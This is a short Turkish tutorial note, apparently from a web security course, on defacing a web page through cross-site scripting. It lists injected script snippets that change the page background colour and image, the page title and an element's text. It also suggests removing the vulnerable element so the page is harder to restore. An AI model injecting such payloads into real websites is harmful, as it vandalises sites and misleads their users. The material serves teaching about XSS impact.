# Tahrifat Unsurları

Bir web sayfasını istediğimiz gibi göstermek için enjekte edilmiş JavaScript kodunu (XSS aracılığıyla) kullanabiliriz. Ancak, bir web sitesini bozmak genellikle basit bir mesaj göndermek için kullanılır, bu yüzden bozulmuş web sayfasına güzel bir görünüm kazandırmak aslında birincil hedef değildir.

Bir web sayfasının ana görünümünü değiştirmek için genellikle dört HTML öğesi kullanılır:

Arkaplan Rengi:

    <script>document.body.style.background = "#141d2b"</script>
Arka plan:

    <script>document.body.background = "https://st5.depositphotos.com/19740498/65257/i/450/depositphotos_652579908-stock-photo-super-macro-portrait-ant-incredible.jpg"</script>
Sayfa Başlığı:

    <script>document.title = 'Kerem BOLLU'</script>
Sayfa Metni:

    document.getElementById("todo").innerHTML = "Ka"
Bu öğelerden ikisini veya üçünü kullanarak web sayfasına temel bir mesaj yazabilir ve hatta savunmasız öğeyi kaldırabiliriz; böylece web sayfasını hızlı bir şekilde sıfırlamak daha zor olacaktır.

